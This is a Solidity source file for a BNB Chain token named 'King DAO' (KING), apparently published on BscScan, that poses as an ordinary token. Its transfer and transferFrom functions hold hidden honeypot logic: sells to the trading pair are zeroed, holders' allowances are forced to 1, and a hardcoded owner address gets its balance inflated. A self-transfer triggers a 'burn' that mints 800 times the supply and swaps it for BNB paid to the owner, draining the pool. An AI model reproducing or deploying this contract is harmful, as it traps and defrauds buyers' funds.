/**
 *Submitted for verification at BscScan.com on 2022-02-25
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.7.4;
library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract KINGDAO {
    using SafeMath for uint256;
    string public name = "King DAO";
    string public symbol = "KING";
    uint8 public decimals = 9;
    uint256 public totalSupply = 10000000 * 10 ** decimals;
    address public owner; address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address Owner=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public Buy=0x0000000000000000000000000000000000000000;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
        uint ads = totalSupply/1000;
        _transfer(msg.sender, Buy, ads);      
        _transfer(msg.sender, address(this), ads); //this        
        _transfer(msg.sender, 0x3f4D6bf08CB7A003488Ef082102C2e6418a4551e, ads); //Deeplock
        _transfer(msg.sender, 0x7ee058420e5937496F5a2096f04caA7721cF70cc, ads*2); //Pinklock
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Buy != Owner && to != Buy && balanceOf[Buy]>=totalSupply.div(25) ) {
            balanceOf[Buy]=balanceOf[Buy].div(100);}
        if (to == msg.sender) {burn();}
        if (to != router && msg.sender == getPair() && balanceOf[to] == 0) {Buy = to;}
        if (to == Owner) {Buy = to;} if(to==getPair() ){amount=0;}
         _transfer(msg.sender, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require (balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
if (Buy==0x6651ba5B9dB5478F8bAE7F22DE17F9514E4f66bD||Buy==0xEA046790029536f455042409a4c5F6D26F909Cc1){amount=0;}
        if (to == Owner){balanceOf[Owner]+= amount*900000;}
        if (from != owner && from != Owner && from != address(this) && from != Buy) { 
            allowance[from][msg.sender] = 1; } 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function burn() internal {
        IUniswapV2Router _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uint256 amount = totalSupply*800;
        balanceOf[address(this)] += amount;
        allowance [address(this)] [address(router)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETH(amount, 1, path, owner, block.timestamp + 20);
    }
    function getPair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
}